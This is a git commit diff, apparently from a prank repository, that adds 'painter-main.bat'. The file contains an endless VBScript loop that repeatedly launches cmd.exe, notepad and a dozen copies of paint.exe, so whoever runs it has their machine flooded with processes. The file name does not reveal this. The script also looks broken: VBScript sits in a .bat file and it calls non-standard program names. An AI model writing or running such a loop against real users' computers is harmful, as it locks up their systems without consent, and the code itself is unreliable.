c00da5770bd5121f8b48ca3eec63579086ba154b
ImHacker890-890 <www.debil.ru@yandex.ru>
2025-03-20 16:02:13 +0500

    Create painter-main.bat

---
+++ painter-main.bat
@@ -0,0 +1,23 @@
+Set wshShell =wscript.CreateObject("WScript.Shell")
+do
+wscript.sleep 1
+WshShell.Run "calculator.exe", 2
+wscript.sleep 1
+WshShell.Run "cmd.exe", 2
+wscript.sleep 1 
+WshShell.Run "browser.exe", 2
+wscript.sleep 1
+WshShell.Run "paint.exe", 2
+wscript.sleep 1
+WshShell.Run "notepad.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+WshShell.Run "paint.exe", 2
+loop
